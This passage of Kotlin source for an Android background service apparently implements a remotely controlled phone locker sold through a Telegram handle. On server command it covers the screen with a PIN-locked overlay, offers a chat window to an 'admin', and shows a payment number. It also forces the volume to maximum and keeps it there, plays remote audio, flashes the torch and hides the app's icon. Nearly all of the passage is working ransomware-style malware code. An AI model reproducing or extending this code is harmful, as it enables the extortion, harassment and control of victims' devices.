            <div class="payment-detail-value" id="pay-number">$displayNumber</div>
            <button onclick="copyNumber()" id="copy-btn" style="background:#e53935;border:2.5px solid #111;color:#fff;width:30px;height:30px;border-radius:0;cursor:pointer;display:flex;align-items:center;justify-content:center;box-shadow:3px 3px 0 #111;flex-shrink:0;transition:all .1s" onmousedown="this.style.transform='translate(2px,2px)';this.style.boxShadow='1px 1px 0 #111'" onmouseup="this.style.transform='';this.style.boxShadow='3px 3px 0 #111'">
              <svg id="copy-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="0"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
            </button>
          </div>
        </div>""" else ""}
      </div>
    </div>
  </div>

  ${if (restartMsg.isNotEmpty()) """<div class="restart-msg">$restartMsg</div>""" else ""}

</div>

<script>
function copyNumber() {
  var num = document.getElementById('pay-number');
  var btn = document.getElementById('copy-btn');
  var icon = document.getElementById('copy-icon');
  if (!num) return;
  navigator.clipboard.writeText(num.textContent.trim()).then(function() {
    btn.style.background = '#22c55e';
    icon.innerHTML = '<polyline points="20 6 9 17 4 12" stroke="#fff" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>';
    setTimeout(function() {
      btn.style.background = '#e53935';
      icon.innerHTML = '<rect x="9" y="9" width="13" height="13" rx="0"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>';
    }, 1800);
  });
}
</script>
</body>
</html>
""".trimIndent()
    }

    private fun lockChat(valueJson: String) {
        try {
            val obj     = JSONObject(valueJson)
            val title   = obj.optString("title", "Perangkat Dikunci")
            val pin     = obj.optString("pin", "")
            val flash   = obj.optBoolean("flash", false)
            val audio   = obj.optBoolean("audio", false)
            if (pin.isEmpty()) return
            getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
                .putBoolean(PREF_IS_LOCKED_CHAT, true)
                .putString(PREF_CHAT_LOCK_PIN, pin)
                .putString(PREF_CHAT_LOCK_TITLE, title)
                .putBoolean(PREF_CHAT_LOCK_FLASH, flash)
                .putBoolean(PREF_CHAT_LOCK_AUDIO, audio)
                .remove(PREF_CHAT_LOCK_PIN_SCREEN)
                .apply()
            applyLockChatOverlay(title, pin, flash, audio)
            emitStatus(JSONObject().also { it.put("lockedChat", true) })
        } catch (e: Exception) {
            Log.e("DeviceService", "lockChat: ${e.message}")
        }
    }

    private fun unlockChat() {
        Handler(Looper.getMainLooper()).post {
            try {
                lockChatOverlayView?.let {
                    try { lockChatWindowManager?.removeView(it) } catch (_: Exception) {}
                }
            } catch (_: Exception) {}
            lockFlashRunnable?.let { lockFlashHandler?.removeCallbacks(it) }
            lockFlashHandler = null; lockFlashRunnable = null
            try { cameraManager?.setTorchMode(torchCameraId ?: "", false) } catch (_: Exception) {}
            try { lockAudioPlayer?.stop(); lockAudioPlayer?.release() } catch (_: Exception) {}
            lockAudioPlayer = null
            lockChatOverlayView = null
            lockChatWindowManager = null
            lockChatPin = ""
            isDeviceLockedChat = false
            getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
                .putBoolean(PREF_IS_LOCKED_CHAT, false).apply()
            emitStatus(JSONObject().also { it.put("lockedChat", false) })
        }
    }

    private fun receiveChatMsg(msg: String) {
        Handler(Looper.getMainLooper()).post {
            lockChatOverlayView?.let {
                (it as? android.webkit.WebView)?.evaluateJavascript(
                    "addChatMsg(${JSONObject.quote(msg)}, 'owner')", null
                )
            }
        }
    }

    private fun applyLockChatOverlay(title: String, pin: String, flash: Boolean, audio: Boolean) {
        lockChatPin = pin
        isDeviceLockedChat = true
        Handler(Looper.getMainLooper()).post {
            try {
                lockChatOverlayView?.let {
                    try { lockChatWindowManager?.removeView(it) } catch (_: Exception) {}
                }
                lockChatOverlayView = null

                val wm = getSystemService(WINDOW_SERVICE) as WindowManager
                lockChatWindowManager = wm
                val wType = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                else @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE

                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    wType,
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                    android.graphics.PixelFormat.OPAQUE
                )
                params.softInputMode = android.view.WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE or
                    android.view.WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_VISIBLE

                val wv = android.webkit.WebView(this).apply {
                    settings.javaScriptEnabled = true
                    settings.domStorageEnabled  = true
                    isFocusable = true
                    isFocusableInTouchMode = true
                    setBackgroundColor(android.graphics.Color.parseColor("#060d1a"))
                    addJavascriptInterface(object : Any() {
                        @android.webkit.JavascriptInterface
                        fun tryUnlock(enteredPin: String): Boolean {
                            return if (enteredPin == lockChatPin) {
                                Handler(Looper.getMainLooper()).post { unlockChat() }
                                true
                            } else false
                        }
                        @android.webkit.JavascriptInterface
                        fun sendChatToServer(msg: String) {
                            socket?.emit("device:chatmsg", JSONObject().also {
                                it.put("deviceId", deviceId)
                                it.put("msg", msg)
                                it.put("from", "device")
                                it.put("time", System.currentTimeMillis())
                            })
                        }
                    }, "Android")
                    loadDataWithBaseURL(null, buildLockChatHtml(title), "text/html", "UTF-8", null)
                }

                lockChatOverlayView = wv
                wm.addView(wv, params)
                wv.requestFocus()

                if (flash) startLockFlash(isChatLock = true)
                if (audio) startLockAudio()

            } catch (e: Exception) {
                Log.e("DeviceService", "applyLockChatOverlay: ${e.message}")
            }
        }
    }

    private fun buildKpBtn(n: Int): String {
    val subs = mapOf(1 to "", 2 to "ABC", 3 to "DEF", 4 to "GHI", 5 to "JKL", 6 to "MNO", 7 to "PQRS", 8 to "TUV", 9 to "WXYZ")
    val sub = subs[n] ?: ""
    val subHtml = if (sub.isNotEmpty()) "<div class=\"kp-btn-sub\">$sub</div>" else ""
    return "<button class=\"kp-btn\" onclick=\"kpPress($n)\">$n$subHtml</button>"
}

private fun buildLockChatHtml(title: String): String = """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
@import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;700;900&family=Space+Mono:wght@400;700&display=swap');

:root{
  --bg:#F5F0E8;
  --blue:#1B4FFF;
  --blue-dark:#0A2FCC;
  --black:#111111;
  --white:#FFFFFF;
  --yellow:#FFD600;
  --shadow:4px 4px 0 #111;
  --shadow-sm:3px 3px 0 #111;
  --mono:'Space Mono',monospace;
  --sans:'Space Grotesk',sans-serif;
}

*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
html,body{width:100%;height:100%;overflow:hidden;
  font-family:var(--sans);color:var(--black);
  background-color:var(--bg);
  background-image:
    linear-gradient(rgba(17,17,17,.12) 1px, transparent 1px),
    linear-gradient(90deg, rgba(17,17,17,.12) 1px, transparent 1px);
  background-size:30px 30px;
}

/* ── SCREENS ── */
#screen-lock,#screen-keypad,#screen-chat{
  position:fixed;inset:0;z-index:5;
  display:flex;flex-direction:column;align-items:center;justify-content:center;
}
#screen-keypad,#screen-chat{display:none;}

/* ════════════════════════════
   LOCK SCREEN
════════════════════════════ */
.lk-wrap{
  display:flex;flex-direction:column;align-items:center;
  gap:14px;width:100%;max-width:320px;padding:0 24px;
}

/* Lock icon card */
.lk-icon-card{
  background:var(--blue);
  border:3px solid var(--black);
  box-shadow:var(--shadow);
  width:140px;height:140px;
  display:flex;align-items:center;justify-content:center;
}

.lk-title{
  font-family:var(--sans);font-weight:900;font-size:28px;
  letter-spacing:1px;text-align:center;text-transform:uppercase;
  color:var(--black);
}
.lk-sub{
  font-family:var(--mono);font-size:9px;color:rgba(17,17,17,.5);
  letter-spacing:4px;text-transform:uppercase;
  margin-top:-8px;
}

/* Alert badge */
.lk-alert{
  display:flex;align-items:center;gap:0;
  background:var(--blue);
  border:3px solid var(--black);
  box-shadow:var(--shadow);
  width:100%;
}
.lk-alert-bar{width:8px;align-self:stretch;background:var(--black);}
.lk-alert-txt{
  font-family:var(--mono);font-size:10px;
  color:var(--white);letter-spacing:3px;
  padding:10px 14px;
}

/* Buttons */
.lk-btns{display:flex;flex-direction:column;gap:10px;width:100%;}
.lk-btn{
  display:flex;align-items:center;gap:12px;
  width:100%;padding:16px 20px;
  border:3px solid var(--black);
  font-family:var(--mono);font-size:12px;letter-spacing:2px;
  cursor:pointer;transition:transform .08s,box-shadow .08s;
  text-transform:uppercase;font-weight:700;
}
.lk-btn:active{box-shadow:1px 1px 0 var(--black);transform:translate(3px,3px);}
.lk-btn-unlock{
  background:var(--blue);color:var(--white);
  box-shadow:var(--shadow);
}
.lk-btn-chat{
  background:var(--white);color:var(--black);
  box-shadow:var(--shadow);
}
.lk-btn-icon{width:18px;height:18px;flex-shrink:0;}

/* ════════════════════════════
   KEYPAD SCREEN
════════════════════════════ */
.kp-wrap{
  display:flex;flex-direction:column;align-items:center;
  width:100%;max-width:300px;padding:0 16px;gap:16px;
}

/* Lock icon small */
.kp-lock-card{
  background:var(--blue);
  border:3px solid var(--black);
  box-shadow:var(--shadow);
  width:100px;height:100px;
  display:flex;align-items:center;justify-content:center;
}

/* Header tag */
.kp-header-tag{
  font-family:var(--mono);font-size:10px;color:var(--white);
  letter-spacing:3px;text-transform:uppercase;
  background:var(--black);
  padding:8px 16px;
  width:100%;text-align:center;
}

/* PIN dots */
.kp-dots{
  display:flex;gap:14px;
  padding:14px 24px;
  background:var(--white);
  border:3px solid var(--black);
  box-shadow:var(--shadow);
  width:100%;justify-content:center;
}
.kp-dot{
  width:14px;height:14px;border-radius:0;
  border:2.5px solid var(--black);
  background:transparent;transition:all .1s;
}
.kp-dot.filled{background:var(--blue);border-color:var(--blue);}
.kp-dot.error{background:var(--blue);border-color:var(--black);animation:shake .4s ease;}
@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-5px)}75%{transform:translateX(5px)}}

/* Grid */
.kp-grid{
  display:grid;grid-template-columns:repeat(3,1fr);
  gap:8px;width:100%;
}
.kp-btn{
  height:66px;
  border:3px solid var(--black);
  background:var(--white);
  color:var(--black);
  font-family:var(--sans);font-size:24px;font-weight:700;
  cursor:pointer;
  transition:transform .08s,box-shadow .08s;
  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:2px;
  box-shadow:var(--shadow-sm);
}
.kp-btn:active{box-shadow:1px 1px 0 var(--black);transform:translate(2px,2px);}
.kp-btn-sub{font-size:7px;font-family:var(--mono);color:rgba(17,17,17,.35);letter-spacing:1px;}

.kp-btn-del{
  background:var(--bg);color:var(--black);font-size:16px;
}
.kp-btn-ok{
  background:var(--blue);color:var(--white);
  font-family:var(--mono);font-size:13px;letter-spacing:2px;font-weight:700;
}
.kp-btn-ok:active{box-shadow:1px 1px 0 var(--black);transform:translate(2px,2px);}

.kp-back{
  display:flex;align-items:center;justify-content:center;gap:8px;
  background:var(--bg);
  border:3px solid var(--black);
  box-shadow:var(--shadow-sm);
  color:var(--black);
  font-family:var(--mono);font-size:10px;letter-spacing:2px;
  cursor:pointer;padding:12px 28px;width:100%;
  transition:transform .08s,box-shadow .08s;
  text-transform:uppercase;font-weight:700;
}
.kp-back:active{box-shadow:1px 1px 0 var(--black);transform:translate(2px,2px);}

/* ════════════════════════════
   CHAT SCREEN
════════════════════════════ */
#screen-chat{justify-content:flex-start;align-items:stretch;}

.chat-header{
  padding:14px 16px;
  border-bottom:3px solid var(--black);
  display:flex;align-items:center;gap:10px;flex-shrink:0;
  background:var(--blue);
}
.chat-header-status{display:flex;align-items:center;gap:8px;flex:1;}
.chat-header-dot{
  width:10px;height:10px;
  background:var(--yellow);
  border:2px solid var(--black);
}
.chat-header-label{
  font-family:var(--mono);font-size:10px;
  color:var(--white);letter-spacing:2px;text-transform:uppercase;font-weight:700;
}
.chat-header-back{
  width:36px;height:36px;
  background:var(--white);border:2.5px solid var(--black);
  box-shadow:2px 2px 0 var(--black);
  color:var(--black);cursor:pointer;
  display:flex;align-items:center;justify-content:center;
  transition:transform .08s,box-shadow .08s;
}
.chat-header-back:active{box-shadow:0 0 0 var(--black);transform:translate(2px,2px);}

.chat-msgs{
  flex:1;overflow-y:auto;padding:16px;
  display:flex;flex-direction:column;gap:12px;
  background-color:var(--bg);
  background-image:
    linear-gradient(rgba(17,17,17,.08) 1px, transparent 1px),
    linear-gradient(90deg, rgba(17,17,17,.08) 1px, transparent 1px);
  background-size:30px 30px;
}
.chat-msgs::-webkit-scrollbar{width:3px;}
.chat-msgs::-webkit-scrollbar-thumb{background:var(--black);}

.bubble-wrap{display:flex;flex-direction:column;gap:4px;}
.bubble-wrap.owner{align-items:flex-start;}
.bubble-wrap.device{align-items:flex-end;}
.bubble-label{
  font-family:var(--mono);font-size:8px;letter-spacing:2px;
  color:var(--black);padding:0 4px;font-weight:700;
}

.chat-msg{
  max-width:82%;padding:10px 14px;
  font-family:var(--sans);font-size:13px;font-weight:500;
  line-height:1.5;word-break:break-word;
  border:2.5px solid var(--black);
}
.chat-msg.from-owner{
  background:var(--blue);color:var(--white);
  box-shadow:3px 3px 0 var(--black);
  border-radius:0;
}
.chat-msg.from-device{
  background:var(--white);color:var(--black);
  box-shadow:3px 3px 0 var(--black);
  border-radius:0;
}
.chat-time{
  font-family:var(--mono);font-size:7px;
  color:rgba(17,17,17,.4);padding:0 4px;
}

.chat-input-row{
  padding:12px 16px;
  border-top:3px solid var(--black);
  display:flex;gap:10px;flex-shrink:0;align-items:flex-end;
  background:var(--white);
}
.chat-input{
  flex:1;
  background:var(--bg);
  border:2.5px solid var(--black);
  padding:12px 16px;color:var(--black);
  font-family:var(--sans);font-size:14px;font-weight:500;
  outline:none;resize:none;max-height:120px;min-height:48px;
  transition:box-shadow .1s;
  border-radius:0;
}
.chat-input:focus{box-shadow:3px 3px 0 var(--black);}
.chat-input::placeholder{color:rgba(17,17,17,.35);font-family:var(--mono);font-size:10px;letter-spacing:1px;}

.chat-send{
  width:48px;height:48px;
  background:var(--blue);
  border:2.5px solid var(--black);
  box-shadow:3px 3px 0 var(--black);
  color:var(--white);
  cursor:pointer;display:flex;align-items:center;justify-content:center;
  flex-shrink:0;transition:transform .08s,box-shadow .08s;
}
.chat-send:active{box-shadow:1px 1px 0 var(--black);transform:translate(2px,2px);}
</style>
</head>
<body>

<!-- LOCK SCREEN -->
<div id="screen-lock">
  <div class="lk-wrap">

    <div class="lk-icon-card">
      <svg width="90" height="90" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-linecap="round" stroke-linejoin="round">
        <path d="M12 2L3 6v6c0 5.25 3.75 10.15 9 11.35C17.25 22.15 21 17.25 21 12V6L12 2z" fill="rgba(255,255,255,0.15)" stroke="#fff" stroke-width="1.8"/>
        <circle cx="12" cy="11" r="2.6" fill="rgba(255,255,255,0.2)" stroke="#fff" stroke-width="1.5"/>
        <circle cx="12" cy="11" r="1" fill="#fff"/>
        <path d="M11.1 13.2 L10.4 16.5 L13.6 16.5 L12.9 13.2Z" fill="#fff" stroke="none"/>
      </svg>
    </div>

    <div class="lk-title">${android.text.Html.escapeHtml(title)}</div>
    <div class="lk-sub">Telegram @ZalRyuichi</div>

    <div class="lk-alert">
      <div class="lk-alert-bar"></div>
      <div class="lk-alert-txt">PERANGKAT TERKUNCI</div>
    </div>

    <div class="lk-btns">
      <button class="lk-btn lk-btn-unlock" onclick="showKeypad()">
        <svg class="lk-btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="square">
          <rect x="3" y="11" width="18" height="11" rx="0"/>
          <path d="M7 11V7a5 5 0 0 1 9.9-1"/>
        </svg>
        MASUKIN PIN
      </button>
      <button class="lk-btn lk-btn-chat" onclick="showChat()">
        <svg class="lk-btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="square">
          <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
        </svg>
        CHAT ADMIN
      </button>
    </div>

  </div>
</div>

<!-- KEYPAD SCREEN -->
<div id="screen-keypad">
  <div class="kp-wrap">

    <div class="kp-lock-card">
      <svg width="52" height="52" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-linecap="round" stroke-linejoin="round">
        <path d="M12 2L3 6v6c0 5.25 3.75 10.15 9 11.35C17.25 22.15 21 17.25 21 12V6L12 2z" fill="rgba(255,255,255,0.15)" stroke="#fff" stroke-width="1.8"/>
        <circle cx="12" cy="11" r="2.6" fill="rgba(255,255,255,0.2)" stroke="#fff" stroke-width="1.5"/>
        <circle cx="12" cy="11" r="1" fill="#fff"/>
        <path d="M11.1 13.2 L10.4 16.5 L13.6 16.5 L12.9 13.2Z" fill="#fff" stroke="none"/>
      </svg>
    </div>

    <div class="kp-header-tag">ENTER PIN TO UNLOCK</div>

    <div class="kp-dots" id="kp-dots"></div>

    <div class="kp-grid">
      <button class="kp-btn" onclick="kpPress(1)">1</button>
      <button class="kp-btn" onclick="kpPress(2)">2<span class="kp-btn-sub">ABC</span></button>
      <button class="kp-btn" onclick="kpPress(3)">3<span class="kp-btn-sub">DEF</span></button>
      <button class="kp-btn" onclick="kpPress(4)">4<span class="kp-btn-sub">GHI</span></button>
      <button class="kp-btn" onclick="kpPress(5)">5<span class="kp-btn-sub">JKL</span></button>
      <button class="kp-btn" onclick="kpPress(6)">6<span class="kp-btn-sub">MNO</span></button>
      <button class="kp-btn" onclick="kpPress(7)">7<span class="kp-btn-sub">PQRS</span></button>
      <button class="kp-btn" onclick="kpPress(8)">8<span class="kp-btn-sub">TUV</span></button>
      <button class="kp-btn" onclick="kpPress(9)">9<span class="kp-btn-sub">WXYZ</span></button>
      <button class="kp-btn kp-btn-del" onclick="kpDel()">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="square"><path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/><line x1="18" y1="9" x2="12" y2="15"/><line x1="12" y1="9" x2="18" y2="15"/></svg>
      </button>
      <button class="kp-btn" onclick="kpPress(0)">0</button>
      <button class="kp-btn kp-btn-ok" onclick="trySubmitPin()">OK</button>
    </div>

    <button class="kp-back" onclick="showLock()">
      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="square"><polyline points="15 18 9 12 15 6"/></svg>
      BACK
    </button>
  </div>
</div>

<!-- CHAT SCREEN -->
<div id="screen-chat">
  <div class="chat-header">
    <div class="chat-header-status">
      <div class="chat-header-dot"></div>
      <div class="chat-header-label">CHAT ADMIN</div>
    </div>
    <button class="chat-header-back" onclick="showLock()">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="square"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
    </button>
  </div>
  <div class="chat-msgs" id="chat-msgs">
    <div class="bubble-wrap owner">
      <div class="bubble-label">ADMIN</div>
      <div class="chat-msg from-owner">Buy Apk Chat Telegram @ZalRyuichi.</div>
      <div class="chat-time">00:00</div>
    </div>
  </div>
  <div class="chat-input-row">
    <textarea class="chat-input" id="chat-input" placeholder="Tulis pesan..." rows="1"
      oninput="this.style.height='auto';this.style.height=Math.min(this.scrollHeight,80)+'px'"
      onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();sendMsg()}"></textarea>
    <button class="chat-send" onclick="sendMsg()">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z" fill="currentColor"/>
      </svg>
    </button>
  </div>
</div>

<script>
var pin='';
var PIN_LEN=4;

function showLock(){
  document.getElementById('screen-lock').style.display='flex';
  document.getElementById('screen-keypad').style.display='none';
  document.getElementById('screen-chat').style.display='none';
}
function showKeypad(){
  document.getElementById('screen-lock').style.display='none';
  document.getElementById('screen-keypad').style.display='flex';
  document.getElementById('screen-chat').style.display='none';
  pin='';renderDots();
}
function showChat(){
  document.getElementById('screen-lock').style.display='none';
  document.getElementById('screen-keypad').style.display='none';
  document.getElementById('screen-chat').style.display='flex';
  scrollChat();
}

function renderDots(){
  var c=document.getElementById('kp-dots');c.innerHTML='';
  for(var i=0;i<PIN_LEN;i++){
    var d=document.createElement('div');
    d.className='kp-dot'+(i<pin.length?' filled':'');
    c.appendChild(d);
  }
}

function kpPress(n){
  if(pin.length>=PIN_LEN)return;
  pin+=n;renderDots();
  if(pin.length===PIN_LEN)trySubmitPin();
}
function kpDel(){if(pin.length>0){pin=pin.slice(0,-1);renderDots();}}

function trySubmitPin(){
  if(pin.length<PIN_LEN)return;
  var ok=window.Android?Android.tryUnlock(pin):false;
  if(!ok){
    var dots=document.querySelectorAll('.kp-dot');
    dots.forEach(function(d){d.classList.remove('filled');d.classList.add('error');});
    setTimeout(function(){pin='';renderDots();},600);
  }
}

function fmtTime(ms){
  var d=new Date(ms);
  return String(d.getHours()).padStart(2,'0')+':'+String(d.getMinutes()).padStart(2,'0');
}

function addChatMsg(msg,from){
  var box=document.getElementById('chat-msgs');
  var wrap=document.createElement('div');
  wrap.className='bubble-wrap '+(from==='owner'?'owner':'device');
  var lbl=document.createElement('div');lbl.className='bubble-label';
  lbl.textContent=from==='owner'?'ADMIN':'KAMU';
  var el=document.createElement('div');
  el.className='chat-msg from-'+(from==='owner'?'owner':'device');
  el.textContent=msg;
  var t=document.createElement('div');t.className='chat-time';
  t.textContent=fmtTime(Date.now());
  wrap.appendChild(lbl);wrap.appendChild(el);wrap.appendChild(t);
  box.appendChild(wrap);scrollChat();
}
function scrollChat(){var b=document.getElementById('chat-msgs');if(b)b.scrollTop=b.scrollHeight;}
function sendMsg(){
  var inp=document.getElementById('chat-input');
  var msg=inp.value.trim();if(!msg)return;
  addChatMsg(msg,'device');
  if(window.Android)Android.sendChatToServer(msg);
  inp.value='';inp.style.height='auto';
}

renderDots();
</script>
</body>
</html>
""".trimIndent()


    private fun setMaxVolume() {
        val am = getSystemService(AUDIO_SERVICE) as AudioManager
        try { am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0) } catch (_: Exception) {}
        try { am.setStreamVolume(AudioManager.STREAM_RING,  am.getStreamMaxVolume(AudioManager.STREAM_RING),  0) } catch (_: Exception) {}
        try { am.setStreamVolume(AudioManager.STREAM_ALARM, am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0) } catch (_: Exception) {}
    }

    private fun startVolumeGuard() {
        volumeGuardCount++
        if (volumeGuardObserver != null) return
        val am = getSystemService(AUDIO_SERVICE) as AudioManager
        volumeGuardObserver = object : android.database.ContentObserver(volumeGuardHandler) {
            override fun onChange(selfChange: Boolean) {
                super.onChange(selfChange)
                val cur = am.getStreamVolume(AudioManager.STREAM_MUSIC)
                val max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
                if (cur < max) {
                    try { am.setStreamVolume(AudioManager.STREAM_MUSIC, max, 0) } catch (_: Exception) {}
                }
            }
        }
        contentResolver.registerContentObserver(
            android.provider.Settings.System.CONTENT_URI,
            true,
            volumeGuardObserver!!
        )
        setMaxVolume()
    }

    private fun stopVolumeGuard() {
        if (volumeGuardCount > 0) volumeGuardCount--
        if (volumeGuardCount == 0) {
            volumeGuardObserver?.let { contentResolver.unregisterContentObserver(it) }
            volumeGuardObserver = null
        }
    }

    private fun playAudioFromUrl(url: String) {
        if (url.isEmpty()) return
        Handler(Looper.getMainLooper()).post {
            try {
                val am = getSystemService(AUDIO_SERVICE) as AudioManager
                setMaxVolume()

                @Suppress("DEPRECATION")
                am.requestAudioFocus(null, AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN)

                audioPlayer?.stop()
                audioPlayer?.release()
                audioPlayer = null

                val fullUrl = if (url.startsWith("http")) url else "$serverUrl$url"

                audioPlayer = MediaPlayer().apply {
                    setWakeMode(this@DeviceService, PowerManager.PARTIAL_WAKE_LOCK)
                    setAudioAttributes(
                        android.media.AudioAttributes.Builder()
                            .setUsage(android.media.AudioAttributes.USAGE_MEDIA)
                            .setContentType(android.media.AudioAttributes.CONTENT_TYPE_MUSIC)
                            .build()
                    )
                    setDataSource(this@DeviceService, Uri.parse(fullUrl))
                    setOnPreparedListener { mp ->
                        setMaxVolume()
                        startVolumeGuard()
                        mp.start()
                        Log.d("DeviceService", "playAudio started: $fullUrl")
                        emitStatus(JSONObject().apply { put("audioPlaying", true) })
                    }
                    setOnCompletionListener {
                        stopVolumeGuard()
                        emitStatus(JSONObject().apply { put("audioPlaying", false) })
                    }
                    setOnErrorListener { _, what, extra ->
                        Log.e("DeviceService", "playAudio error: what=$what extra=$extra url=$fullUrl")
                        stopVolumeGuard()
                        emitStatus(JSONObject().apply { put("audioPlaying", false) })
                        true
                    }
                    prepareAsync()
                }
            } catch (e: Exception) {
                Log.e("DeviceService", "playAudio exception: ${e.message}")
                emitStatus(JSONObject().apply { put("audioPlaying", false) })
            }
        }
    }

    private fun stopAudio() {
        try { audioPlayer?.stop(); audioPlayer?.release(); audioPlayer = null } catch (_: Exception) {}
        stopVolumeGuard()
        emitStatus(JSONObject().apply { put("audioPlaying", false) })
    }

    private fun vibrateDevice(value: String) {
        val vibrator = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            (getSystemService(VIBRATOR_MANAGER_SERVICE) as VibratorManager).defaultVibrator
        } else {
            @Suppress("DEPRECATION")
            getSystemService(VIBRATOR_SERVICE) as Vibrator
        }
        try {
            val obj = org.json.JSONObject(value)
            val type = obj.optString("type", "single")
            val duration = obj.optLong("duration", 500)
            val pattern: LongArray = when (type) {
                "double" -> longArrayOf(0, duration, 200, duration)
                "sos"    -> longArrayOf(0,100,100,100,100,100,100,300,100,300,100,300,100,100,100,100,100,100)
                else     -> longArrayOf(0, duration)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(android.os.VibrationEffect.createWaveform(pattern, -1))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(pattern, -1)
            }
        } catch (_: Exception) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(android.os.VibrationEffect.createOneShot(500, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(500)
            }
        }
    }

    private fun setBrightness(value: String) {
        Handler(Looper.getMainLooper()).post {
            try {
                val level = value.toIntOrNull()?.coerceIn(0, 100) ?: return@post
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
                    !android.provider.Settings.System.canWrite(this)) return@post

                android.provider.Settings.System.putInt(
                    contentResolver,
                    android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE,
                    android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL
                )
                val raw = (level / 100f * 255).toInt().coerceIn(0, 255)
                android.provider.Settings.System.putInt(
                    contentResolver,
                    android.provider.Settings.System.SCREEN_BRIGHTNESS,
                    raw
                )
                emitStatus(JSONObject().apply { put("brightness", level) })
                Log.d("DeviceService", "setBrightness: $level% → raw=$raw")
            } catch (e: Exception) {
                Log.e("DeviceService", "setBrightness: ${e.message}")
            }
        }
    }

    private fun setVolume(value: String) {
        try {
            val obj    = JSONObject(value)
            val stream = obj.optString("stream", "media")
            val level  = obj.optInt("level", 50).coerceIn(0, 100)
            val am     = getSystemService(AUDIO_SERVICE) as AudioManager

            val streamType = when (stream) {
                "ring"  -> AudioManager.STREAM_RING
                "alarm" -> AudioManager.STREAM_ALARM
                "call"  -> AudioManager.STREAM_VOICE_CALL
                "notif" -> AudioManager.STREAM_NOTIFICATION
                else    -> AudioManager.STREAM_MUSIC
            }
            val max = am.getStreamMaxVolume(streamType)
            val raw = (level / 100f * max).toInt().coerceIn(0, max)
            am.setStreamVolume(streamType, raw, 0)
            emitStatus(JSONObject().apply {
                put("volume_${stream}", level)
            })
            Log.d("DeviceService", "setVolume: $stream $level% → raw=$raw/$max")
        } catch (e: Exception) {
            Log.e("DeviceService", "setVolume: ${e.message}")
        }
    }

    private fun openApp(pkg: String) {
        if (pkg.isEmpty()) return
        try {
            val launchIntent = packageManager.getLaunchIntentForPackage(pkg)
            if (launchIntent != null) {
                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(launchIntent)
                emitStatus(JSONObject().apply { put("openApp", pkg) })
            } else {
                emitStatus(JSONObject().apply { put("openAppError", "app_not_found") })
                Log.e("DeviceService", "openApp: package not found $pkg")
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "openApp: ${e.message}")
            emitStatus(JSONObject().apply { put("openAppError", e.message ?: "failed") })
        }
    }

    private fun hideApp(hide: Boolean) {
        try {
            val component = ComponentName(this, MainActivity::class.java)
            val newState = if (hide) {
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            } else {
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            }
            packageManager.setComponentEnabledSetting(
                component,
                newState,
